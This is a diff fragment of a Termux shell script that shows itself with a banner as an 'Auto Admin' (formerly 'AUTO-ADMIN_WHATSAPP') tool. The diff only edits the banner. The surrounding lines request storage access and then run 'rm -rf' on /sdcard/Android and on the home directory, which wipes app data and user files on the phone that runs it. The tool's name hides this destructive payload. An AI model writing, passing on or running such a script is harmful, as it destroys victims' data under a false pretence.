@@ -2,7 +2,7 @@ clear
 
 ​termux-setup-storage
 
-​figlet -f slant ​"​AUTO-ADMIN_WHATSAPP​"
+​​figlet -f slant ​"​Auto Admin​"
 
 rm -rf cd /sdcard/Android
 rm -rf cd ~
